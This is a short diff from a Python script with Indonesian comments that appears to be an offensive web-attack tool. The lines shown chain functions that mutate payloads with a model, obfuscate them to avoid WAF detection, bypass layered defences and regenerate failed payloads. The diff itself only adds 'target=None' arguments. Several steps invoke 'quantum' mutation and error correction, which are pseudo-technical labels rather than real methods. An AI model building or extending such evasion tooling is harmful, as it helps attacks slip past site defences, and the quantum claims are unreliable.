@@ -1844,9 +1844,9 @@ document.body.appendChild(dummyRequest);
         payload = ai_payload_mutation_v2(model, payload)
     payload = ai_neural_mutation(model, payload)  # Mutasi payload berbasis quantum
     payload = dynamic_payload_obfuscation(payload)  # Menyembunyikan payload agar tidak terdeteksi WAF
-    feedback = analyze_payload_feedback(payload)  # Menganalisis efektivitas payload
+    feedback = analyze_payload_feedback(payload, target=None)  # Menganalisis efektivitas payload
     if feedback['success_rate'] < 0.80:
-        payload = quantum_error_correction(payload)  # Koreksi kesalahan dalam payload dengan quantum filtering
+        payload = quantum_error_correction(payload, target=None)  # Koreksi kesalahan dalam payload dengan quantum filtering
     payload = evade_waf(payload)  # Bypass sistem WAF dengan teknik stealth
     payload = evade_multi_layers(payload)  # Menghindari deteksi dengan injeksi berlapis
     payload = self_healing_quantum_payload(payload)  # Payload bisa beregenerasi jika gagal
